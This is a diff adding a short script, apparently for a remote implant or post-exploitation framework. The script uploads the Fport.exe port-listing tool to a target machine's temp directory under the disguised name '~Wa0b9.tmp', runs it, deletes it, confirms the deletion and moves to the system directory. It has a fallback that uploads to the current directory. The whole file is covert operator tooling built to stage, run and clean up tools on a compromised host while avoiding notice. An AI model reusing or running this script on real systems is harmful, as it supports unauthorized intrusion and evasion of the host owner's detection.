@@ -1,0 +1,48 @@
+#-------------------------------------------------------------------------------
+# File: fport.eps
+# Description: Uploads the Fport.exe tool to the targets temp directory.
+#			It then executes fport with the /p option to sort the 
+#			output by port.
+#			It will then delete the uploaded file and return the 
+#			targets system directory.
+# 05 Mar 2004  Created....vrs
+#
+#-------------------------------------------------------------------------------
+
+@echo off;
+@record on;
+string $ScriptsDir;
+if(`getdirectory -scripts`) {
+  string $Dir = GetCmdData("dir");
+	$ScriptsDir = $Dir[0];
+}else{
+	$ScriptsDir="E:\\resources\\ep\\scripts";
+}
+@record off;
+@echo on;
+
+@record on;
+`getsyspaths`;
+string $sTmpPath = GetCmdData("temporaryPath");
+string $sSysPath = GetCmdData("SystemDirectoryPath");
+
+
+if (`cd $sTmpPath`){
+
+	`put $ScriptsDir\\..\\..\\..\\tools\\fport.exe -name ~Wa0b9.tmp`;
+	prompt `run -command "~Wa0b9.tmp /p" -redirect fport`;
+	if (prompt `del ~Wa0b9.tmp`){
+		`dir ~Wa0b9.tmp`;
+		`cd $sSysPath`;
+	}
+
+
+}else {
+	echo "Failed to cd to the temp dir.";
+	if (prompt "Upload to the current dir?"){
+		`put $ScriptsDir\\..\\..\\..\\fport.exe -name ~Wa0b9.tmp`;
+		prompt `run -command "~Wa0b9.tmp /p" -redirect fport`;
+		prompt`del ~Wa0b9.tmp`;
+	}
+		
+}
